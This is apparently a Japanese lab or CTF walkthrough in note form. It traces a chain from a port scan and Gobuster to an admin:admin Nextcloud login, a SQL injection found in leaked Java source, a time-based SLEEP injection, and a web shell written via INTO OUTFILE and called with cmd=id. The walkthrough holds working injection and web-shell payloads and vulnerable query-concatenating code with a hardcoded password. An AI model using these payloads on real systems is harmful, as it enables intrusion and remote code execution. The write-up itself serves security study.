- 隠されたWebディレクトリからadmin:adminで認証→ソースコードを入手→ソースコードからSQLiの脆弱性を発見→Blind SQLi x MySQLのCode Executionを実行

1. ポートスキャンの結果、３つのWebサービスを発見

2. それぞれにGobusterを実行し、ある一つにNextcloud（OSSのファイル共有ツール）のログイン画面を発見

3. admin:adminでログインし、別のポートで稼働しているwebサービスのファイル類を入手
	- **まずはadmin:adminなど、簡単なパスワードでログイン施行すること**。これはガチで習慣づけて。

4. config、ソースコードを探すとソースコードにSQLiに脆弱と思われるページを発見
```java
@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);
```
- `priority`がサニタイズされず、RequestParamとして送付されている

5. カラム数が１つであることを考慮して、UNION based SQLiからのMySQLのコマンド実行ができるかもと考え、Time-based SQLiを実行
```
http://182.168.137.49:17455/issue/checkByPriority?Priority=High' UNION SELECT SLEEP(5); #
```

6. Time-based SQLiがうまくいったので、[[SQL Injection#★Webシェルの書き込み（MySQL）]]を実行
```
http://182.168.137.49:17455/issue/checkByPriority?Priority=High' UNION SELECT "<?php system($_GET[\"cmd\"]);?>" INTO OUTFILE "/srv/html/webshell.php" #
```
- 上記の`srv/html`は、別の webサービスでphpinfoを閲覧し、DOCUMENT_ROOTが当該ディレクトリであることから選択

7. 別のWebサービスでPHPが動作している（phpinfoにアクセスできるもの）ので、そちらにアクセスしてweb shellを実行
```
http://182.168.137.49:30455/webshell.php?cmd=id
```